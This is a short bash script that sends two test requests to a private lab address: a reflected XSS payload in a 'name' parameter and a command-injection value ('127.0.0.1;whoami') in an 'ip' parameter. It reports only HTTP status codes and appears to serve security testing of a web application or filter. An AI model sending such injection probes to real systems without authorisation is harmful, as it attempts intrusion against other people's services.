#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-https://192.168.56.20}"

echo "[*] Starting OWASP Top 10 (A03 Injection) attacks against $TARGET"

# XSS Reflected
echo "[+] Testing Reflected XSS"
curl -k -s -o /dev/null -w "HTTP Status: %{http_code}\n" "$TARGET/?name=%3Cscript%3Ealert(1)%3C/script%3E"

# Command Injection
echo "[+] Testing Command Injection"
curl -k -s -o /dev/null -w "HTTP Status: %{http_code}\n" "$TARGET/?ip=127.0.0.1%3Bwhoami"

echo "[+] OWASP attack suite finished."
